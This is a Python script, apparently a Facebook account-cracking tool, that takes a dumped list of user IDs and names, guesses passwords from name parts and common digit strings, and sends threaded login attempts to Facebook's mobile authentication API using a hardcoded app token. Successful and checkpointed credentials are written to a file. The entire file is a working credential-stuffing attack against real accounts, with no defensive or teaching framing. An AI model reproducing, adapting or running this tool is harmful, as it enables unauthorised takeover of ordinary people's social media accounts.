import requests, json, sys, os, re
from multiprocessing.pool import ThreadPool as th
from datetime import datetime

class Brute:

    def __init__(self):
        self.setpw = False
        self.ok = []
        self.cp = []
        self.loop = 0

    def bruteRequest(self, username, password):
        params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
           'format': 'JSON', 
           'sdk_version': '2', 
           'email': username, 
           'locale': 'en_US', 
           'password': password, 
           'sdk': 'ios', 
           'generate_session_cookies': '1', 
           'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
        try:
            os.mkdir('out')
        except:
            pass

        api = 'https://b-api.facebook.com/method/auth.login'
        response = requests.get(api, params=params)
        if re.search('(EAAA)\\w+', response.text):
            self.ok.append(username + ' ' + password)
            save = open('out/successful.txt', 'a')
            save.write(str(username) + '  ' + str(password) + '\n')
            save.close()
            return True
        else:
            if 'www.facebook.com' in response.json()['error_msg']:
                self.cp.append(username + '  ' + password)
                save = open('out/successful.txt', 'a')
                save.write(str(username) + '  ' + str(password) + '\n')
                save.close()
                return True
            return False

    def brute(self, users):
        if self.setpw == False:
            self.loop += 1
            for pw in users['pw']:
                username = users['id'].lower()
                password = pw.lower()
                try:
                    if self.bruteRequest(username, password) == True:
                        break
                except:
                    pass

                sys.stdout.write(('\r\x1b[0;97m [\x1b[0;94m{}\x1b[0;97m] Crack {}/{}\x1b[0;92m OK \x1b[0;97m:\x1b[0;92m {}\x1b[0;93m CP \x1b[0;97m:\x1b[0;93m {} ').format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp)))
                sys.stdout.flush()

        else:
            self.loop += 1
            for pw in self.setpw:
                username = users['id'].lower()
                password = pw.lower()
                try:
                    if self.bruteRequest(username, password) == True:
                        break
                except:
                    pass

                sys.stdout.write(('\r\x1b[0;97m [\x1b[0;94m{}\x1b[0;97m] Crack Started By Profisor {}/{}\x1b[0;92m OK \x1b[0;97m:\x1b[0;92m {}\x1b[0;93m CP \x1b[0;97m:\x1b[0;93m {} ').format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp)))
                sys.stdout.flush()

    def main(self):
        while True:
            file = raw_input('\x1b[0;97m [\x1b[0;94m\xe2\x80\xa2\x1b[0;97m] Contoh Dump \x1b[0;91m:\x1b[0;97m [\x1b[0;93m dump/xnxx.json\x1b[0;97m ]\n [\x1b[0;91m?\x1b[0;97m]\x1b[0;97m Output Dump\x1b[0;91m :\x1b[0;92m ')
            try:
                list = open(file, 'r').read()
                object = json.loads(list)
                break
            except IOError:
                print '\n\x1b[0;91m File\x1b[0;97m [ \x1b[0;92m%s\x1b[0;97m ]\x1b[0;91m Tidak Ada!' % file

        self.target = []
        for user in object:
            try:
                obj = user['name'].split(' ')
                if len(obj) == 1:
                    listpass = [obj[0] + '1234', obj[0] + '1234',
                     obj[0] + '12345']
                elif len(obj) == 2:
                    listpass = [obj[0] + '1234', obj[0] + '12345',
                     obj[1] + '1234', obj[1] + '12345']
                elif len(obj) == 3:
                    listpass = [obj[0] + '1234', obj[0] + '12345',
                     obj[1] + '1234', obj[1] + '1234',
                     obj[2] + '1234', obj[2] + '12345']
                elif len(obj) == 4:
                    listpass = [obj[0] + '1234', obj[0] + '12345',
                     obj[1] + '1234', obj[1] + '12345',
                     obj[2] + '1234', obj[2] + '12345',
                     obj[3] + '1234', obj[3] + '12345']
                else:
                    listpass = ['1234554321', '1122334455',
                     '123456654321', '112233445566',
                     '123456789']
                self.target.append({'id': user['uid'], 'pw': listpass})
            except:
                pass

        if len(self.target) == 0:
            exit('\x1b[0;91m\x1b[0;97mSelect [\x1b[0;92m %s \x1b[0;97m]' % file)
        ask = raw_input('\x1b[0;97m [\x1b[0;91m?\x1b[0;97m] [d]\x1b[0;91m :\x1b[0;92m ')
        os.system('clear')
        print('''\033[1;97m----------------------------------------------------------------------------
\033[1;90m..\033[1;91m########\033[1;90m..\033[1;91m########\033[1;90m...\033[1;91m#######\033[1;90m..\033[1;91m########\033[1;90m.\033[1;91m####\033[1;90m..\033[1;91m######\033[1;90m...\033[1;91m#######\033[1;90m..\033[1;91m########\033[1;90m...
\033[1;90m..\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m..\033[1;91m##\033[1;90m....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m..
\033[1;90m..\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m..\033[1;91m##\033[1;90m.......\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m..
\033[1;90m..\033[1;91m########\033[1;90m..\033[1;91m########\033[1;90m..\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m######\033[1;90m....\033[1;91m##\033[1;90m...\033[1;91m######\033[1;90m..\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m########\033[1;90m...
\033[1;90m..\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m...\033[1;91m##\033[1;90m...\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m...\033[1;91m##\033[1;90m....
\033[1;90m..\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m....\033[1;91m##\033[1;90m..\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m..\033[1;91m##\033[1;90m....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m.\033[1;91m##\033[1;90m....\033[1;91m##\033[1;90m...
\033[1;90m..\033[1;91m##\033[1;90m........\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m..\033[1;91m#######\033[1;90m..\033[1;91m##\033[1;90m.......\033[1;91m####\033[1;90m..\033[1;91m######\033[1;90m...\033[1;91m#######\033[1;90m..\033[1;91m##\033[1;90m.....\033[1;91m##\033[1;90m..
\033[1;97m----------------------------------------------------------------------------
 Coded by : Pr0fisor
 Channel  : \033[1;91m@\033[1;97mCrackerForKurd0
\033[1;97m----------------------------------------------------------------------------
''')
        if ask.lower() == 'm':
            while True:
                print '\n\x1b[0;97m [\x1b[0;94m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mContoh Password\x1b[0;91m: \x1b[0;92msayang,doraemon,bangsat,kontol,bismillah,cantik\n'
                self.setpw = raw_input('\x1b[0;97m [\x1b[0;91m?\x1b[0;97m] \x1b[0;97mMasukan Password \x1b[0;91m:\x1b[0;92m ').strip().split(',')
                if self.setpw[0] != '':
                    break

        th(30).map(self.brute, self.target)
        self.results()
        exit()

    def results(self):
        if len(self.ok) != 0:
            print '\n\n\x1b[0;92mSuccessful \x1b[0;91m:\x1b[0;92m ' + str(len(self.ok))
            for i in self.ok:
                print '\x1b[0;90m>>>\033[1;92m '+str(i) + ' \033[1;90m+ \033[1;92mSuccessful'

            print '\x1b[0;97mHamw Successful akan chwna naw file \x1b[0;91m:\x1b[0;92m successful.txt'
        if len(self.cp) != 0:
            print '\n\n\x1b[0;96mCheckPoint \x1b[0;91m:\x1b[0;96m ' + str(len(self.cp))
            for i in self.cp:
                print '\x1b[0;96m\x1b[0;90m>>>\033[1;96m '+str(i) + ' \033[1;90m+ \033[1;91mCheckPoint'

            print '\x1b[0;96mHamw CheckPointakan Chwna naw file \x1b[0;91m:\x1b[0;96m checkpoint.txt'
        if len(self.cp) == 0 and len(self.ok) == 0:
            print '\n\x1b[0;96m Hiachi nahema dwbara hawl bdawa\x1b[0m'
